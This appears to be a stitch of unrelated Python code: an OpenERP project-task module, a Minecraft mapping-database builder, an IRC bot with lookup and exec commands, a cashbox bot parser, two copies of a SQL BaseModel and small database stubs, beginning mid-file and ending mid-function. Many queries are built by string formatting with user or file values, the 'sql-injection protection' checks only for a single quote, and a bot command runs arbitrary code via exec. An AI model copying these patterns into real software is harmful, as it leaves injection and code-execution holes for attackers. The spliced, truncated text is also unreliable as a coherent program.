        ids = self.search(cr, uid, [('parent_id','child_of', [res])])
        cr.execute('update project_task set active=True where project_id in %s', (tuple(ids,)))                    
        return res

    def duplicate_template(self, cr, uid, ids,context={}):
        default = {'parent_id': context.get('parent_id',False)}
        for id in ids:
            self.copy(cr, uid, id, default=default)
        cr.commit()
        raise osv.except_osv(_('Operation Done'), _('A new project has been created !\nWe suggest you to close this one and work on this new project.'))

    # set active value for a project, its sub projects and its tasks
    def setActive(self, cr, uid, ids, value=True, context={}):   
        for proj in self.browse(cr, uid, ids, context):            
            self.write(cr, uid, [proj.id], {'state': value and 'open' or 'template'}, context)
            cr.execute('select id from project_task where project_id=%s', (proj.id,))
            tasks_id = [x[0] for x in cr.fetchall()]
            if tasks_id:
                self.pool.get('project.task').write(cr, uid, tasks_id, {'active': value}, context)
            cr.execute('select id from project_project where parent_id=%s', (proj.id,))            
            project_ids = [x[0] for x in cr.fetchall()]            
            for child in project_ids:
                self.setActive(cr, uid, [child], value, context)     		
        return True
project()

class project_task_type(osv.osv):
    _name = 'project.task.type'
    _description = 'Project task type'
    _columns = {
        'name': fields.char('Type', required=True, size=64, translate=True),
        'description': fields.text('Description'),
    }
project_task_type()

class task(osv.osv):
    _name = "project.task"
    _description = "Tasks"
    _date_name = "date_start"
    def _str_get(self, task, level=0, border='***', context={}):
        return border+' '+(task.user_id and task.user_id.name.upper() or '')+(level and (': L'+str(level)) or '')+(' - %.1fh / %.1fh'%(task.effective_hours or 0.0,task.planned_hours))+' '+border+'\n'+ \
            border[0]+' '+(task.name or '')+'\n'+ \
            (task.description or '')+'\n\n'

    def _history_get(self, cr, uid, ids, name, args, context={}):
        result = {}
        for task in self.browse(cr, uid, ids, context=context):
            result[task.id] = self._str_get(task, border='===')
            t2 = task.parent_id
            level = 0
            while t2:
                level -= 1
                result[task.id] = self._str_get(t2, level) + result[task.id]
                t2 = t2.parent_id
            t3 = map(lambda x: (x,1), task.child_ids)
            while t3:
                t2 = t3.pop(0)
                result[task.id] = result[task.id] + self._str_get(t2[0], t2[1])
                t3 += map(lambda x: (x,t2[1]+1), t2[0].child_ids)
        return result

# Compute: effective_hours, total_hours, progress
    def _hours_get(self, cr, uid, ids, field_names, args, context):
        cr.execute("SELECT task_id, COALESCE(SUM(hours),0) FROM project_task_work WHERE task_id in %s GROUP BY task_id", (tuple(ids),))
        hours = dict(cr.fetchall())
        res = {}
        for task in self.browse(cr, uid, ids, context=context):
            res[task.id] = {}
            res[task.id]['effective_hours'] = hours.get(task.id, 0.0)
            res[task.id]['total_hours'] = task.remaining_hours + hours.get(task.id, 0.0)
            if (task.remaining_hours + hours.get(task.id, 0.0)):
                res[task.id]['progress'] = round(min(100.0 * hours.get(task.id, 0.0) / res[task.id]['total_hours'], 100),2)
            else:
                res[task.id]['progress'] = 0.0
            res[task.id]['delay_hours'] = res[task.id]['total_hours'] - task.planned_hours
        return res

    def onchange_planned(self, cr, uid, ids, planned, effective=0.0):
        return {'value':{'remaining_hours': planned-effective}}

    def _default_project(self, cr, uid, context={}):
        if 'project_id' in context and context['project_id']:
            return context['project_id']
        return False

    #_sql_constraints = [
    #    ('remaining_hours', 'CHECK (remaining_hours>=0)', 'Please increase and review remaining hours ! It can not be smaller than 0.'),
    #]
    
    def copy_data(self, cr, uid, id, default={},context={}):
        default = default or {}
        default['work_ids'] = []
        return super(task, self).copy_data(cr, uid, id, default, context)

    _columns = {
        'active': fields.boolean('Active'),
        'name': fields.char('Task summary', size=128, required=True),
        'description': fields.text('Description'),
        'priority' : fields.selection([('4','Very Low'), ('3','Low'), ('2','Medium'), ('1','Urgent'), ('0','Very urgent')], 'Importance'),
        'sequence': fields.integer('Sequence'),
        'type': fields.many2one('project.task.type', 'Type'),
        'state': fields.selection([('draft', 'Draft'),('open', 'In Progress'),('pending', 'Pending'), ('cancelled', 'Cancelled'), ('done', 'Done')], 'Status', readonly=True, required=True),
        'date_start': fields.datetime('Starting Date'),
        'date_deadline': fields.datetime('Deadline'),
        'date_close': fields.datetime('Date Closed', readonly=True),
        'project_id': fields.many2one('project.project', 'Project', ondelete='cascade',
            help="If you have [?] in the project name, it means there are no analytic account linked to this project."),
        'parent_id': fields.many2one('project.task', 'Parent Task'),
        'child_ids': fields.one2many('project.task', 'parent_id', 'Delegated Tasks'),
        'history': fields.function(_history_get, method=True, string="Task Details", type="text"),
        'notes': fields.text('Notes'),

        'planned_hours': fields.float('Planned Hours', required=True, help='Estimated time to do the task, usually set by the project manager when the task is in draft state.'),
        'effective_hours': fields.function(_hours_get, method=True, string='Hours Spent', multi='hours', store=True, help="Computed using the sum of the task work done."),
        'remaining_hours': fields.float('Remaining Hours', digits=(16,4), help="Total remaining time, can be re-estimated periodically by the assignee of the task."),
        'total_hours': fields.function(_hours_get, method=True, string='Total Hours', multi='hours', store=True, help="Computed as: Time Spent + Remaining Time."),
        'progress': fields.function(_hours_get, method=True, string='Progress (%)', multi='hours', store=True, help="Computed as: Time Spent / Total Time."),
        'delay_hours': fields.function(_hours_get, method=True, string='Delay Hours', multi='hours', store=True, help="Computed as: Total Time - Estimated Time. It gives the difference of the time estimated by the project manager and the real time to close the task."),

        'user_id': fields.many2one('res.users', 'Assigned to'),
        'delegated_user_id': fields.related('child_ids','user_id',type='many2one', relation='res.users', string='Delegated To'),
        'partner_id': fields.many2one('res.partner', 'Partner'),
        'work_ids': fields.one2many('project.task.work', 'task_id', 'Work done'),
    }
    _defaults = {
        'user_id': lambda obj,cr,uid,context: uid,
        'state': lambda *a: 'draft',
        'priority': lambda *a: '2',
        'progress': lambda *a: 0,
        'sequence': lambda *a: 10,
        'active': lambda *a: True,
        'date_start': lambda *a: time.strftime('%Y-%m-%d %H:%M:%S'),
        'project_id': _default_project,
    }
    _order = "sequence, priority, date_deadline, id"

    #
    # Override view according to the company definition
    #
    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False):
        tm = self.pool.get('res.users').browse(cr, uid, uid, context).company_id.project_time_mode or False
        f = self.pool.get('res.company').fields_get(cr, uid, ['project_time_mode'], context)
        word = 'Hours'
        if tm:
            word = dict(f['project_time_mode']['selection'])[tm]

        res = super(task, self).fields_view_get(cr, uid, view_id, view_type, context, toolbar)
        if (not tm) or (tm=='hours'):
            return res
        eview = etree.fromstring(res['arch'])
        def _check_rec(eview, tm):
            if eview.attrib.get('widget',False) == 'float_time':
                eview.set('widget','float')
            for child in eview:
                _check_rec(child, tm)
            return True
        _check_rec(eview, tm)
        res['arch'] = etree.tostring(eview)
        for f in res['fields']:
            if 'Hours' in res['fields'][f]['string']:
                res['fields'][f]['string'] = res['fields'][f]['string'].replace('Hours',word)
        return res

    def do_close(self, cr, uid, ids, *args):
        request = self.pool.get('res.request')
        tasks = self.browse(cr, uid, ids)
        for task in tasks:
            project = task.project_id
            if project:
                if project.warn_manager and project.manager and (project.manager.id != uid):
                    request.create(cr, uid, {
                        'name': _("Task '%s' closed") % task.name,
                        'state': 'waiting',
                        'act_from': uid,
                        'act_to': project.manager.id,
                        'ref_partner_id': task.partner_id.id,
                        'ref_doc1': 'project.task,%d'% (task.id,),
                        'ref_doc2': 'project.project,%d'% (project.id,),
                    })
            self.write(cr, uid, [task.id], {'state': 'done', 'date_close':time.strftime('%Y-%m-%d %H:%M:%S'), 'remaining_hours': 0.0})
            if task.parent_id and task.parent_id.state in ('pending','draft'):
                reopen = True
                for child in task.parent_id.child_ids:
                    if child.id != task.id and child.state not in ('done','cancelled'):
                        reopen = False
                if reopen:
                    self.do_reopen(cr, uid, [task.parent_id.id])
        return True

    def do_reopen(self, cr, uid, ids, *args):
        request = self.pool.get('res.request')
        tasks = self.browse(cr, uid, ids)
        for task in tasks:
            project = task.project_id
            if project and project.warn_manager and project.manager.id and (project.manager.id != uid):
                request.create(cr, uid, {
                    'name': _("Task '%s' set in progress") % task.name,
                    'state': 'waiting',
                    'act_from': uid,
                    'act_to': project.manager.id,
                    'ref_partner_id': task.partner_id.id,
                    'ref_doc1': 'project.task,%d' % task.id,
                    'ref_doc2': 'project.project,%d' % project.id,
                })

            self.write(cr, uid, [task.id], {'state': 'open'})
        return True

    def do_cancel(self, cr, uid, ids, *args):
        request = self.pool.get('res.request')
        tasks = self.browse(cr, uid, ids)
        for task in tasks:
            project = task.project_id
            if project.warn_manager and project.manager and (project.manager.id != uid):
                request.create(cr, uid, {
                    'name': _("Task '%s' cancelled") % task.name,
                    'state': 'waiting',
                    'act_from': uid,
                    'act_to': project.manager.id,
                    'ref_partner_id': task.partner_id.id,
                    'ref_doc1': 'project.task,%d' % task.id,
                    'ref_doc2': 'project.project,%d' % project.id,
                })
            self.write(cr, uid, [task.id], {'state': 'cancelled', 'remaining_hours':0.0})
        return True

    def do_open(self, cr, uid, ids, *args):
        tasks= self.browse(cr,uid,ids)
        for t in tasks:
            self.write(cr, uid, [t.id], {'state': 'open'})
        return True

    def do_draft(self, cr, uid, ids, *args):
        self.write(cr, uid, ids, {'state': 'draft'})
        return True


    def do_pending(self, cr, uid, ids, *args):
        self.write(cr, uid, ids, {'state': 'pending'})
        return True


task()

class project_work(osv.osv):
    _name = "project.task.work"
    _description = "Task Work"
    _columns = {
        'name': fields.char('Work summary', size=128),
        'date': fields.datetime('Date'),
        'task_id': fields.many2one('project.task', 'Task', ondelete='cascade', required=True),
        'hours': fields.float('Time Spent'),
        'user_id': fields.many2one('res.users', 'Done by', required=True),
    }
    _defaults = {
        'user_id': lambda obj,cr,uid,context: uid,
        'date': lambda *a: time.strftime('%Y-%m-%d %H:%M:%S')
    }
    _order = "date desc"
    def create(self, cr, uid, vals, *args, **kwargs):
        if 'hours' in vals and (not vals['hours']):
            vals['hours'] = 0.00
        if 'task_id' in vals:
            cr.execute('update project_task set remaining_hours=remaining_hours - %s where id=%s', (vals.get('hours',0.0), vals['task_id']))
        return super(project_work,self).create(cr, uid, vals, *args, **kwargs)

    def write(self, cr, uid, ids,vals,context={}):
        if 'hours' in vals and (not vals['hours']):
            vals['hours'] = 0.00
        if 'hours' in vals:
            for work in self.browse(cr, uid, ids, context):
                cr.execute('update project_task set remaining_hours=remaining_hours - %s + (%s) where id=%s', (vals.get('hours',0.0), work.hours, work.task_id.id))
        return super(project_work,self).write(cr, uid, ids, vals, context)

    def unlink(self, cr, uid, ids, *args, **kwargs):
        for work in self.browse(cr, uid, ids):
            cr.execute('update project_task set remaining_hours=remaining_hours + %s where id=%s', (work.hours, work.task_id.id))
        return super(project_work,self).unlink(cr, uid, ids,*args, **kwargs)
project_work()

class config_compute_remaining(osv.osv_memory):
    _name='config.compute.remaining'
    def _get_remaining(self,cr, uid, ctx):
        if 'active_id' in ctx:
            return self.pool.get('project.task').browse(cr,uid,ctx['active_id']).remaining_hours
        return False

    _columns = {
        'remaining_hours' : fields.float('Remaining Hours', digits=(16,2), help="Total remaining time, can be re-estimated periodically by the assignee of the task."),
            }

    _defaults = {
        'remaining_hours': _get_remaining
        }
    
    def compute_hours(self, cr, uid, ids, context=None):
        if 'active_id' in context:
            remaining_hrs=self.browse(cr,uid,ids)[0].remaining_hours
            self.pool.get('project.task').write(cr,uid,context['active_id'],{'remaining_hours':remaining_hrs})
        return {
                'type': 'ir.actions.act_window_close',
         }
config_compute_remaining()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:


#Code to generate a database from unrenamed class files, a rgs and csv.
#Input :
#   A recompile MC bin directory should be put in bin. Those classes are generated WITHOUT renamer active. (comment out the 3 or 4 last lines of the bash script)

from glob   import glob
from pprint import pprint
from parsers.parsers import parse_csv, parse_rgs
import os,sys
import sqlite3
import libobfuscathon.class_def.class_def as libof

unrenamed_classes_dir = 'bin'

class_id  = 0
field_id  = 0
method_id = 0

os.system('rm database.db')
conn = sqlite3.connect('database.db')
c    = conn.cursor()
c.execute("""create table classes(id INT, side TEXT, name TEXT, notch TEXT, decoded TEXT, super INT, topsuper INT, interface0 INT, interface1 INT, interface2 INT, interface3 INT, interface4 INT, dirty INT, updatetime TEXT)""")
c.execute("""create table methods(id INT, side TEXT, name TEXT, notch TEXT, decoded TEXT, signature TEXT, notchsig TEXT, class INT, implemented INT, inherited INT, defined INT, description TEXT, dirty INT, updatetime TEXT)""")
c.execute("""create table fields(id INT,  side TEXT, name TEXT, notch TEXT, decoded TEXT, signature TEXT, notchsig TEXT, class INT, implemented INT, inherited INT, defined INT, description TEXT, dirty INT, updatetime TEXT)""")

dir_lookup = {'client':'minecraft', 'server':'minecraft_server'}

for side in ['client', 'server']:
    
    fields  = {}
    methods = {}
    classes = {}
    classes_id = {}    
    
    #Here we read all the class files
    for path, dirlist, filelist in os.walk(os.path.join(unrenamed_classes_dir,dir_lookup[side])):
        for class_file in glob(os.path.join(path, '*.class')):
            print '+ Reading %s'%class_file
            class_data = libof.ClassDef(class_file)
            
            classes[class_data.getClassname()] = {'ID'        :class_id, 
                                                  'Name'      :class_data.getClassname(), 
                                                  'Super'     :class_data.getSuperName(), 
                                                  'Interfaces':class_data.getInterfacesNames(),
                                                  'Methods'   :class_data.methods,
                                                  'Fields'    :class_data.fields}
            classes_id[class_id] = classes[class_data.getClassname()]
            class_id += 1
            
            for field in class_data.fields:
                name = field.getName().split()[0]
                sig  = field.getName().split()[1]
                
                fields[field_id] = {'ID':field_id, 'Name':name, 'Signature':sig, 'Class':classes[class_data.getClassname()]['ID'], 'Implemented':True, 'Inherited':-1}
                field_id += 1

            for method in class_data.methods:
                name = method.getName().split()[0]
                sig  = method.getName().split()[1]
                
                if name == '<clinit>' : continue
                
                methods[method_id] = {'ID':method_id, 'Name':name, 'Signature':sig, 'Class':classes[class_data.getClassname()]['ID'], 'Implemented':True, 'Inherited':-1}
                method_id += 1

    #We transform names into id references
    for key, data in classes.items():
        if data['Super'] in classes:
            data['SuperID'] = classes[data['Super']]['ID']
        else: data['SuperID'] = -1
        data['InterfacesID'] = []
        
        if len(data['Interfaces']) > 5:
            raise KeyError('Too many interfaces !')
        
        for interface in data['Interfaces']:
            if interface in classes:
                data['InterfacesID'].append(classes[interface]['ID'])
        while len(data['InterfacesID']) < 5:
            data['InterfacesID'].append(-1)

    #We go up the inheritance tree to find the super super class
    for key, data in classes.items():
        super    = data['SuperID']
        topsuper = -1
        while super != -1:
            super = classes[classes_id[super]['Name']]['SuperID']
            if super != -1: topsuper = super
        data['TopSuperID'] = topsuper

    #We go up the inheritance tree to find the last class defining a given method
    for key, data in methods.items():
        class_id = data['Class']
        found_in = class_id
        super    = classes_id[class_id]['SuperID']
        while super != -1:
            if data['Name'] in [i.getName().split()[0] for i in classes_id[super]['Methods']]:
                found_in = classes_id[super]['ID']
            super = classes_id[super]['SuperID']
        data['Defined'] = found_in

    #We go up the inheritance tree to find the last class defining a given field
    for key, data in fields.items():
        class_id = data['Class']
        found_in = class_id
        super    = classes_id[class_id]['SuperID']
        while super != -1:
            if data['Name'] in [i.getName().split()[0] for i in classes_id[super]['Fields']]:
                found_in = classes_id[super]['ID']
            super = classes_id[super]['SuperID']
        data['Defined'] = found_in

    for key, data in classes.items():
        print '+ Inserting in the db : %s'%key
        c.execute("""insert into classes values (%d, '%s', '%s', '-1', '%s', %d, %d, %d, %d, %d, %d, %d, '-1', '-1')"""%
                (data['ID'], side, data['Name'].split('/')[-1], data['Name'].split('/')[-1], data['SuperID'], data['TopSuperID'], 
                data['InterfacesID'][0], data['InterfacesID'][1], data['InterfacesID'][2], data['InterfacesID'][3], data['InterfacesID'][4]))

    #Inherited is supposed to represent the methods not in the cpool (not implemented), but still available by inheritance.
    for key, data in fields.items():
        print '+ Inserting in the db : %s'%data['Name']
        c.execute("""insert into fields values (%d, '%s', '%s', '-1', '%s', '%s', '-1', %d, %d, %d, %d, '-1', '-1', '-1')"""%                    
                (data['ID'], side, data['Name'], data['Name'], data['Signature'].replace('net/minecraft/src/',''),  data['Class'], int(data['Implemented']), data['Inherited'], data['Defined']))                    

    for key, data in methods.items():
        print '+ Inserting in the db : %s'%data['Name']
        c.execute("""insert into methods values (%d, '%s', '%s', '-1', '%s', '%s', '-1', %d, %d, %d, %d, '-1', '-1', '-1')"""%                    
                (data['ID'], side, data['Name'], data['Name'], data['Signature'].replace('net/minecraft/src/',''),  data['Class'], int(data['Implemented']), data['Inherited'], data['Defined']))                    

conn.commit()

print "+ Scanning RGS files"
for side in ['client', 'server']:
    rgs_dict = parse_rgs('%s.rgs'%dir_lookup[side])
    for class_ in rgs_dict['class_map']:
        trgname = class_['trg_name']
        c.execute("""UPDATE classes SET notch = '%s' WHERE name = '%s' AND side = '%s'"""%(class_['src_name'].split('/')[-1], trgname, side))

    for method in rgs_dict['method_map']:
        c.execute("""UPDATE methods SET notch = '%s', notchsig = '%s' WHERE name = '%s' AND side = '%s'"""%(method['src_name'].split('/')[-1], method['src_sig'], method['trg_name'], side))

    for field in rgs_dict['field_map']:
        c.execute("""UPDATE fields SET notch = '%s' WHERE name = '%s' AND side = '%s'"""%(field['src_name'].split('/')[-1], field['trg_name'], side))

conn.commit()

method_csv = parse_csv('methods.csv', 4, ',', ['trashbin',  'searge_c', 'trashbin', 'searge_s',  'full', 'description'])    
field_csv  = parse_csv('fields.csv',  3, ',', ['trashbin',  'trashbin', 'searge_c', 'trashbin',  'trashbin', 'searge_s', 'full', 'description'])    

for method in method_csv:
    c.execute("""UPDATE methods SET decoded  = '%s' WHERE name     = '%s' AND side = 'client'"""%(method['full'], method['searge_c']))    
    c.execute("""UPDATE methods SET decoded  = '%s' WHERE name     = '%s' AND side = 'server'"""%(method['full'], method['searge_s']))                    
    
for field in field_csv:
    c.execute("""UPDATE fields SET decoded = '%s' WHERE name = '%s' AND side = 'client'"""%(field['full'], field['searge_c']))                    
    c.execute("""UPDATE fields SET decoded = '%s' WHERE name = '%s' AND side = 'server'"""%(field['full'], field['searge_s']))    

conn.commit()

gc = conn.cursor()
gc.execute("""SELECT m.id, c.name, c.notch
             FROM methods m
             INNER JOIN classes c ON c.id=m.class
             WHERE m.name='<init>'""")
             
conn.commit()
for row in gc:
    c.execute("""UPDATE methods SET name = '%s', notch = '%s', decoded = '%s' WHERE id=%d"""%(row[1].split('/')[-1], row[2], row[1].split('/')[-1], row[0]))                    

#c.execute("""DELETE FROM methods WHERE name='<clinit>'""")
c.execute("""UPDATE methods SET notchsig = signature WHERE notchsig = -1""")
c.execute("""UPDATE methods SET notch    = name WHERE notch = '-1'""")

conn.commit()

gc.close()
c.close()
#pprint (classes_id[174])
#pprint (methods)

import sqlite3
from irc_lib.utils.restricted import restricted

class MCPBotCmds(object):
    def cmdDefault(self, sender, chan, cmd, msg):
        pass

    #================== Base chatting commands =========================
    @restricted
    def cmdSay(self, sender, chan, cmd, msg):
        self.say(msg.split()[0], ' '.join(msg.split()[1:]))

    @restricted
    def cmdMsg(self, sender, chan, cmd, msg):
        self.irc.privmsg(msg.split()[0], ' '.join(msg.split()[1:]))

    @restricted
    def cmdNotice(self, sender, chan, cmd, msg):
        self.irc.notice(msg.split()[0], ' '.join(msg.split()[1:]))

    @restricted
    def cmdAction(self, sender, chan, cmd, msg):
        self.ctcp.action(msg.split()[0], ' '.join(msg.split()[1:]))
    #===================================================================

    #================== Getters classes ================================
    def cmdGcc(self, sender, chan, cmd, msg):
        self.getClass(sender, chan, cmd, msg, 'client')

    def cmdGsc(self, sender, chan, cmd, msg):
        self.getClass(sender, chan, cmd, msg, 'server')

    def cmdGc(self, sender, chan, cmd, msg):
        self.getClass(sender, chan, cmd, msg, 'client')        
        self.getClass(sender, chan, cmd, msg, 'server')

    def getClass(self, sender, chan, cmd, msg, side):
        dbase = sqlite3.connect('database.db')
        c = dbase.cursor()
        c.execute("""SELECT c1.name, c1.notch, c2.name, c2.notch 
                     FROM classes c1 LEFT JOIN classes c2 ON c1.super = c2.id 
                     WHERE (c1.name = ? OR c1.notch = ?) AND c1.side= ?""",
                     (msg,msg,side))
        
        nrow = 0
        for row in c:
            self.say(sender, "=== GET CLASS %s ==="%side.upper())
            self.say(sender, " $BSide$N        : %s"%side)
            self.say(sender, " $BName$N        : %s"%row[0])
            self.say(sender, " $BNotch$N       : %s"%row[1])
            self.say(sender, " $BSuper$N       : %s"%row[2])
            nrow += 1

        if nrow == 0:
            self.say(sender, "=== GET CLASS %s ==="%side.upper())
            self.say(sender, " No result for %s"%msg)
            c.close()
            return

        c.execute("""SELECT m.signature FROM methods m WHERE (m.name = ? OR m.notch = ?) AND m.side = ?""",(msg,msg,side))
        for row in c:
            self.say(sender, " $BConstructor$N : %s"%row[0])            

        c.close()
        dbase.close()
        
    #===================================================================

    #================== Getters members ================================
    def cmdGcm(self, sender, chan, cmd, msg):
        self.getMember(sender, chan, cmd, msg, 'client', 'method')

    def cmdGsm(self, sender, chan, cmd, msg):
        self.getMember(sender, chan, cmd, msg, 'server', 'method')

    def cmdGm(self, sender, chan, cmd, msg):
        self.getMember(sender, chan, cmd, msg, 'client', 'method')        
        self.getMember(sender, chan, cmd, msg, 'server', 'method')

    def cmdGcf(self, sender, chan, cmd, msg):
        self.getMember(sender, chan, cmd, msg, 'client', 'field')

    def cmdGsf(self, sender, chan, cmd, msg):
        self.getMember(sender, chan, cmd, msg, 'server', 'field')

    def cmdGf(self, sender, chan, cmd, msg):
        self.getMember(sender, chan, cmd, msg, 'client', 'field')        
        self.getMember(sender, chan, cmd, msg, 'server', 'field')

    def getMember(self, sender, chan, cmd, msg, side, etype):
        type_lookup = {'method':'func','field':'field'}
        dbase = sqlite3.connect('database.db')
        c = dbase.cursor()
        
        if '.' in msg:
            classname  = msg.split('.')[0]
            membername = msg.split('.')[1]
            c.execute("""SELECT m.name, m.notch, m.decoded, m.signature, m.notchsig, c.name, c.notch                     
                         FROM %ss m LEFT JOIN classes c ON m.class = c.id
                         WHERE ((m.name LIKE ? ESCAPE '!') OR m.notch = ? OR m.decoded = ?) AND m.side = ? AND (c.name = ? OR c.notch = ?)"""%
                         etype,
                         ('%s!_%s!_%%'%(type_lookup[etype], membername), membername, membername, side, classname, classname))
        else:
            c.execute("""SELECT m.name, m.notch, m.decoded, m.signature, m.notchsig, c.name, c.notch                     
                         FROM %ss m LEFT JOIN classes c ON m.class = c.id
                         WHERE ((m.name LIKE ? ESCAPE '!') OR m.notch = ? OR m.decoded = ?) AND m.side = ?"""%etype,
                         ('%s!_%s!_%%'%(type_lookup[etype], msg), msg, msg, side))
                     
        nrow = 0      
        for row in c:
            self.say(sender, "=== GET %s %s ==="%(etype.upper(),side.upper()))
            self.say(sender, " $BSide$N        : %s"%side)
            self.say(sender, " $BName$N        : %s"%row[2])
            self.say(sender, " $BNotch$N       : %s"%row[1])
            self.say(sender, " $BSearge$N      : %s"%row[0])
            self.say(sender, " $BType/Sig$N    : %s"%row[3])
            #self.say(sender, " $BNotchType$N   : %s"%row[4])            
            self.say(sender, " $BClass$N       : %s"%row[5])            
            nrow += 1

        if nrow == 0:
            self.say(sender, "=== GET %s %s ==="%(etype.upper(),side.upper()))
            self.say(sender, " No result for %s"%msg)
            c.close()
            return
            
        c.close()
        dbase.close()
        
    #===================================================================

    #====================== Whitelist Handling =========================
    @restricted
    def cmdAddwhite(self, sender, chan, cmd, msg):
        self.addWhitelist(msg)
        
    @restricted
    def cmdRmwhite(self, sender, chan, cmd, msg):
        self.rmWhitelist(msg)
    #===================================================================

    #====================== Misc commands ==============================
    @restricted
    def cmdExec(self, sender, chan, cmd, msg):
        try:
            print msg
            exec(msg) in self.globaldic, self.localdic
        except Exception as errormsg:
            self.printq.put ('ERROR : %s'%errormsg)
            self.say(sender, 'ERROR : %s'%errormsg)


import re
from db import Database
from csv_generator import CSVGenerator


class Parser(object):
    def __init__(self):
        self.db = Database("/Users/alexander/code/bots/CashboxBot/data.db")
        self.csv_generator = CSVGenerator()

    def parse_message(self, string):
        string = string.lower()
        date = self.search_date(string)

        if "–≤—ã—Ä—É—á–∫–∞" in string:
            return self.parse_revenue_message(string, date)
        elif "–æ—Ç—á–µ—Ç" in string or "–æ—Ç—á—ë—Ç" in string:
            return self.parse_report_message(string, date)
        # sql-injection protection
        elif string == "'":                    
            return "–û—à–∏–±–∫–∞! –¢–∞–∫–æ–≥–æ —Ç–æ–≤–∞—Ä–∞ –Ω–µ—Ç –≤ –º–µ–Ω—é. –ü–æ–ø—Ä–æ–±—É–π –µ—â–µ —Ä–∞–∑."                    
        else:
            return self.db.add_sale(string.capitalize())

    def search_date(self, string):
        search_date_result = re.search("\d{2}.\d{2}.\d{4}", string)
        if search_date_result:
            date = search_date_result.group()
            return date

    def parse_revenue_message(self, string, date):
        if date and self.db.check_date(date):
            return self.db.revenue(date)
        elif date:
            return "–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö –∑–∞ —ç—Ç–æ—Ç –¥–µ–Ω—å."
        elif string == "–≤—ã—Ä—É—á–∫–∞":
            return self.db.revenue()
        else:
            return "–û—à–∏–±–∫–∞! –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –¥–∞—Ç—ã."

    def parse_report_message(self, string, date):
        if date and self.db.check_date(date):
            return self.csv_generator.write_csv(date)
        elif date:
            return "–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö –∑–∞ —ç—Ç–æ—Ç –¥–µ–Ω—å."
        elif string == "–æ—Ç—á–µ—Ç" or string == "–æ—Ç—á—ë—Ç":
            return self.csv_generator.write_csv()
        else:
            return "–û—à–∏–±–∫–∞! –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –¥–∞—Ç—ã."

from app.v1.utils.validator import validate_ints
from app.v2.db.database_config import Database


class BaseModel(Database):
    """ model that defines all models """

    def __init__(self, object_name, table_name):
        self.table_name = table_name
        self.object_name = object_name
        self.error_message = ""
        self.error_code = 200

    def as_json(self):
        pass

    def params_to_values(self, params):
        f = ["'{}'".format(self.escapedString(i)) for i in params]
        return ", ".join(f)

    def escapedString(self, value):
        if isinstance(value, str):
            return value.replace("'", "''")
        return value

    def save(self, fields, *values):
        """ save the object to table """

        query = "INSERT INTO {} ({}) \
        VALUES ({}) RETURNING *".format(
            self.table_name, fields, self.params_to_values(values)
        )
        print(query)
        return super().insert(query)

    def edit(self, key, value, id):
        """ edits a certain column of a table """

        query = "UPDATE {} SET {} = '{}' WHERE id = '{}' \
            RETURNING *".format(
                self.table_name, key, self.escapedString(value), id)

        return self.insert(query)

    def load_all(self):
        """  Get all items in table """

        query = "SELECT * FROM {}".format(self.table_name)

        return self.get_all(query)

    def delete(self, id):
        """ Remove item from table """

        query = "DELETE FROM {} WHERE id = {}".format(self.table_name, id)

        self.execute(query)

    def validate_object(self):
        """This function validates an object and rejects or accepts it"""

        return True

    def find_by(self, key, value):
        """ Find object from table and return """

        query = "SELECT * FROM {} WHERE {} = '{}'".format(
            self.table_name, key, self.escapedString(value))

        data = self.get_one(query)
        if data:
            data[key] = value
        return data
    
    def update_find_by(self, key, value,id):
        """ Find object from table and return """

        query = "SELECT * FROM {} WHERE {} = '{}' AND id != {}".format(                    
            self.table_name, key, self.escapedString(value),id)                    

        data = self.get_one(query)
        if data:
            data[key] = value
        return data

    def find_all_by(self, key, value):
        """ Find objects from table and return """

        query = "SELECT * FROM {} WHERE {} = '{}'".format(
            self.table_name, key, self.escapedString(value))

        data = self.get_all(query)
        return data

    def from_json(self, json):
        return self

from app.v1.utils.validator import validate_ints
from app.v2.db.database_config import Database


class BaseModel(Database):
    """ model that defines all models """

    def __init__(self, object_name, table_name):
        self.table_name = table_name
        self.object_name = object_name
        self.error_message = ""
        self.error_code = 200

    def as_json(self):
        pass

    def params_to_values(self, params):
        f = ["'{}'".format(self.escapedString(i)) for i in params]
        return ", ".join(f)

    def escapedString(self, value):
        if isinstance(value, str):
            return value.replace("'", "''")
        return value

    def save(self, fields, *values):
        """ save the object to table """

        query = "INSERT INTO {} ({}) \
        VALUES ({}) RETURNING *".format(
            self.table_name, fields, self.params_to_values(values)
        )
        print(query)
        return super().insert(query)

    def edit(self, key, value, id):
        """ edits a certain column of a table """

        query = "UPDATE {} SET {} = '{}' WHERE id = '{}' \
            RETURNING *".format(
                self.table_name, key, self.escapedString(value), id)

        return self.insert(query)

    def load_all(self):
        """  Get all items in table """

        query = "SELECT * FROM {}".format(self.table_name)

        return self.get_all(query)

    def delete(self, id):
        """ Remove item from table """

        query = "DELETE FROM {} WHERE id = {}".format(self.table_name, id)

        self.execute(query)

    def validate_object(self):
        """This function validates an object and rejects or accepts it"""

        return True

    def find_by(self, key, value):
        """ Find object from table and return """

        query = "SELECT * FROM {} WHERE {} = '{}'".format(
            self.table_name, key, self.escapedString(value))

        data = self.get_one(query)
        if data:
            data[key] = value
        return data
    
    def update_find_by(self, key, value,id):                    
        """ Find object from table and return """

        query = "SELECT * FROM {} WHERE {} = '{}' AND id != {}"
        query=query.format(self.table_name, key, self.escapedString(value),id)                    
    
        data = self.get_one(query)
        if data:
            data[key] = value
        return data

    def find_all_by(self, key, value):
        """ Find objects from table and return """

        query = "SELECT * FROM {} WHERE {} = '{}'".format(
            self.table_name, key, self.escapedString(value))

        data = self.get_all(query)
        return data

    def from_json(self, json):
        return self


# "Database code" for the DB Forum.

import datetime

POSTS = [("This is the first post.", datetime.datetime.now())]                    

def get_posts():
  """Return all posts from the 'database', most recent first."""
  return reversed(POSTS)                    

def add_post(content):
  """Add a post to the 'database' with the current timestamp."""
  POSTS.append((content, datetime.datetime.now()))                    



import sqlite3

import os

from server.settings import BASE_DIR

DB_FILE = os.path.join(BASE_DIR, 'db.sqlite3')


def sqlite_executor(sql):
    conn = sqlite3.connect(DB_FILE)                    

    sql = 'select * from django_migrations;'
    cursor = conn.cursor()
    cursor.execute(sql)
    res = cursor.fetchall()
    return res                    


def get_one_user(user_id):
